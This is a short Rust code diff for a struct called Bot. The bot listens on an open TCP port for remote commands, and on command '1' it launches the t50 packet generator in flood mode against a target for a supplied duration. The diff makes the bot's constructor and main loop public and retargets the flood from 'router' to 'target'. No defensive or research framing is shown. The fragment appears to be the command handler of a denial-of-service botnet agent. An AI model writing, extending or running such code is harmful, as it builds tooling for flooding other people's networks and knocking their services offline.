@@ -36,11 +36,11 @@ pub struct Bot {
 }
 
 impl Bot {
-    fn new(port: String) -> Bot {
+    pub fn new(port: String) -> Bot {
         Bot { port: port }
     }
 
-    fn main_loop(&self) {
+    pub fn main_loop(&self) {
         let listener = TcpListener::bind("0.0.0.0:".to_string() + &self.port)
             .expect("Failed to establish socket");
 
@@ -65,7 +65,7 @@ impl Bot {
                 if cmd == "1" {
                     let duration: String = parts.next().unwrap().to_string();
                     Command::new("timeout")
-                        .args(&[&duration, "t50", "--flood", "router"])
+                        .args(&[&duration, "t50", "--flood", "target"])
                         .output()
                         .expect("failed to run t50");
                 }
